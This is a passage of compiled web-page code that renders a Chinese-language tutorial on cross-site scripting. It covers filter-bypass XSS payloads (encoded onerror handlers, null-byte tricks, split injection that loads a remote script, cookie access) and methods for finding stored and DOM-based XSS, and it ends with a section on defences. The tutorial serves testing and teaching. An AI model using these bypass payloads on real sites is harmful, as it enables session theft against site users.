operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"00"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),"img onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"标签名称后的空格"),Object(n.b)("p",null,"一些可用于替代空格的字符"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"img",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"09"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),"onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"img",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"0"),"d",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),"onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"img",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"0"),"a",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),"onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"img",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),'"onerror',Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"属性名称")),Object(n.b)("p",null,"绕开一些检查以",Object(n.b)("inlineCode",{parentName:"p"},"on"),"开头的过滤器"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"img o",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"00"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),"nerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"属性分隔符,把多个属性分隔开"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"img onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'alert(1)'"),"src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"属性值")),Object(n.b)("p",null,"可以用NULL字节或HTML编码属性值"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"img onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"00"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"lert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"img onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),"#x006c",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"ert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"HTML编码 十六进制编码 base64编码 ASCII编码")),Object(n.b)("p",null,"以下属性可以被编码："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),"href",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"\naction",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"\nformaction",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"\nlocation",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"\non",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"*="),"\nname",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"\nbackground",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"\nposter",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"\nsrc",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"\ncode",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"\ndata",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(n.b)("span",c({parentName:"code"},{className:"token comment"}),"//只支持base64")))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"字符集")),Object(n.b)("p",null,"有时可用一些非标准编码绕开过滤器"),Object(n.b)("p",null,"UTF-7、US-ASCII、UTF-16"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"拆分跨站：")),Object(n.b)("p",null,"当应用程序没有过滤<、>关键字却限制了字符长度时可用拆分跨站"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"z",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'<script src='"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(n.b)("span",c({parentName:"code"},{className:"token comment"}),"/*\n\n*/"),"z",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"+="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'test.c'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(n.b)("span",c({parentName:"code"},{className:"token comment"}),"/*\n\n*/"),"z",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"+="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'n/1.js><0/script>'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(n.b)("span",c({parentName:"code"},{className:"token comment"}),"/*\n\n*/"),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"write"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"z",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"最终执行"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(n.b)("pre",c({parentName:"div"},{className:"language-text"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-text"}),"<script>\n\nz='undefined<script src=test.cn/1.js><\/script>';\n\ndocument.write(z)\n\n<\/script>"))),Object(n.b)("h4",{className:"__internal",id:"避开过滤：脚本代码"},"避开过滤：脚本代码",Object(n.b)("a",c({parentName:"h4"},{href:"#%E9%81%BF%E5%BC%80%E8%BF%87%E6%BB%A4%EF%BC%9A%E8%84%9A%E6%9C%AC%E4%BB%A3%E7%A0%81","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"有些过滤器可能阻止javascript关键字和表达式，有用的字符，比如引号、括号和圆点。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"Unicode转义")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"a\\",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"u006cert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"如果能够使用eval命令，就能够将其它命令以字符串的格式传送给eval，从而执行其它 命令。"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"eval"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'a\\u006cert(1)'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"替代圆点")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'cookie'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"with"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"cookie",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("h2",{className:"__internal",id:"查找利用存储型xss"},"查找利用存储型XSS",Object(n.b)("a",c({parentName:"h2"},{href:"#%E6%9F%A5%E6%89%BE%E5%88%A9%E7%94%A8%E5%AD%98%E5%82%A8%E5%9E%8Bxss","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"确定保存型XSS漏洞的过程与前面描述的确定反射型XSS漏洞的过程类似。 "),Object(n.b)("p",null,"但是，这两个过程之间也存在一些重要的区别；"),Object(n.b)("p",null,"在进行测试时必须记住这些区别，以确定尽可能多的漏洞。"),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"(1) 向应用程序的每一个可能的位置提交一个特殊字符串后，必须反复检查应用程序的全部内容与功能；"),Object(n.b)("p",{parentName:"blockquote"},"(2) 如有可能，应检查管理员能够访问的区域，确定其中是否有可以被非管理用户控制的数据；"),Object(n.b)("p",{parentName:"blockquote"},"​      比如有些应用可以在浏览器查看日志，攻击者可留下恶意的HTML日志加以利用；"),Object(n.b)("p",{parentName:"blockquote"},"(3) 检查应用的整个流程，确保测试彻底，检查任何可控的带外通道，如HTTP消息头；")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"在上传文件中测试XSS")),Object(n.b)("p",null,"如果应用程序允许用户上传可被其它用户查看下载的文件，就会出现保存型XSS，这种漏洞常被人们忽略。"),Object(n.b)("p",null,"测试时，首先上传一个验证性的HTML文件。"),Object(n.b)("p",null,"如果该文件被接受，则尝试以正常方式下载该文件。"),Object(n.b)("p",null,"如果应用程序按照原样返回最初的文件，并且脚本被执行，则应用肯定易于受到攻击。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"例："),"可把XSS的payload做成图片木马，上传到用户头像(用各种方法去绕过上传限制)"),Object(n.b)("h2",{className:"__internal",id:"查找并利用dom型的xss漏洞"},"查找并利用DOM型的XSS漏洞",Object(n.b)("a",c({parentName:"h2"},{href:"#%E6%9F%A5%E6%89%BE%E5%B9%B6%E5%88%A9%E7%94%A8dom%E5%9E%8B%E7%9A%84xss%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"确定基于DOM型的XSS漏洞，一种有效的方法是，检查所有客户端JavaScript， "),Object(n.b)("p",null,"看其中是否使用任何可能会导致漏洞的DOM属性。"),Object(n.b)("p",null,"工具",Object(n.b)("a",c({parentName:"p"},{href:"https://www.blueinfy.com/#DOMTracer",target:"_blank"}),"DOMTracer"),"可自动完成这个测试过程。"),Object(n.b)("p",null,"检查每一段客户端JavaScript，看其中是否出现以下API"),Object(n.b)("p",null,"它们可用于访问通过一个专门设计的URL控制的DOM数据；"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"})," document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"location\n document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token constant"}),"URL"),"\n document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"URLUnencoded\n document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"referrer\n window",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"location"))),Object(n.b)("p",null,"在每一个使用上述API的位置，仔细检查那里的代码，确定应用程序如何处理用户可控的数据；"),Object(n.b)("p",null,"以及是否可以使用专门设计的输入来执行JavaScript。"),Object(n.b)("p",null,"尤其注意检查并测试控制的数据被传送至以下任何一个API的情况"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"write"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\ndocument",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"writeln"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\ndocument",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"body",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"innerHtml\n",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"eval"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\nwindow",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"execScript"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\nwindow",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"setInterval"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\nwindow",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"setTimeout"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(n.b)("p",null,"片段技巧：服务器不解析url中#后的内容"),Object(n.b)("h1",{className:"__internal",id:"防止xss攻击"},"防止XSS攻击",Object(n.b)("a",c({parentName:"h1"},{href:"#%E9%98%B2%E6%AD%A2xss%E6%94%BB%E5%87%BB","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h2",{className:"__internal",id:"防止反射型与存储型xss"},"防止反射型与存储型XSS",Object(n.b)("a",c({parentName:"h2"},{href:"#%E9%98%B2%E6%AD%A2%E5%8F%8D%E5%B0%84%E5%9E%8B%E4%B8%8E%E5%AD%98%E5%82%A8%E5%9E%8Bxss","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"用户可控的数据未经适当的确认与净化就被复制到应用程序响应中，这是造成反射型与保存型XSS漏洞的根本原因 "),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"1.确认输入")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"数据不能太长"),Object(n.b)("p",{parentName:"blockquote"},"数据仅包含某组合法字符"),Object(n.b)("p",{parentName:"blockquote"},"数据与一个特殊的正则表达式相匹配")),Object(n.b)("p",null,"根据应用程序希望在字段中收到的数据类型，应尽可能的限制性的对姓名、电子邮件地址、账号等"),Object(n.b)("p",null,"应用不同的确认规则。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"2.确认输出")),Object(n.b)("p",null,"如果应用程序将某位用户或第三方提交的数据复制到它的响应中，应对这些数据进行HTML编码，净化恶意代码。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"3.消除危险插入点")),Object(n.b)("p",null,"应尽量避免直接在现有的JavaScript中插入用户可控的数据；"),Object(n.b)("p",null,"如果标签属性接受URL作为它的值，应避免嵌入用户的输入；"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"4.允许有限的HTML")),Object(n.b)("p",null,"一些应用程序允许用户以HTML格式提交即将插入到应用程序响应中的数据。"),Object(n.b)("p",null,"例如博客、论坛的富文本编辑器允许使用HTML书写。"),Object(n.b)("p",null,"有各种框架(如OWASP AntiSamy项目)可用于确认用户提交的HTML标记，以确保其中未包含任何执行JavaScript的方法。"),Object(n.b)("h2",{className:"__internal",id:"防止基于dom的xss漏洞"},"防止基于DOM的XSS漏洞",Object(n.b)("a",c({parentName:"h2"},{href:"#%E9%98%B2%E6%AD%A2%E5%9F%BA%E4%BA%8Edom%E7%9A%84xss%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"造成这种漏洞并无法不需要将用户可控的数据复制到服务器响应中，所以上述防范方法对DOM型XSS无用；"),Object(n.b)("p",null,"应用程序应尽量避免使用客户端脚本处理DOM数据并把它插入到页面中；"),Object(n.b)("p",null,"如果无法避免，应使用以下两种方法防御DOM型XSS攻击。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"1.确认输入")),Object(n.b)("p",null,"客户端，确认将要插入到文档中的数据仅包含字母数字与空白符"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n    ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"var")," a ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token constant"}),"URL"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    a ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," a",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"substring"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"a",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"indexOf"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"message="'),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"+")," ",Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"8"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," a",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"length",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    a ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"unescape"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"a",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"var")," regex",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token regex"}),"/^(A-Za-z0-9+\\s)*$/"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"if")," ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"regex",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"test"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"a",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\n        document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"write"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"a",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"服务端，对URL数据进行严格确认"),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"查询字符串中只有一个参数"),Object(n.b)("p",{parentName:"blockquote"},"参数名大小写检查"),Object(n.b)("p",{parentName:"blockquote"},"参数值仅包含数字字母")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"2.确认输出")),Object(n.b)("p",null,"在将用户可控的DOM数据插入到文档之前，进行HTML编码"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"?"),"php\n    ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"function")," ",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"reinit"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token parameter"}),"str"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\n    ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n        ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"var")," d ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"createElement"),Object(n.b)("span",c({parentName:"code"},{className:"token 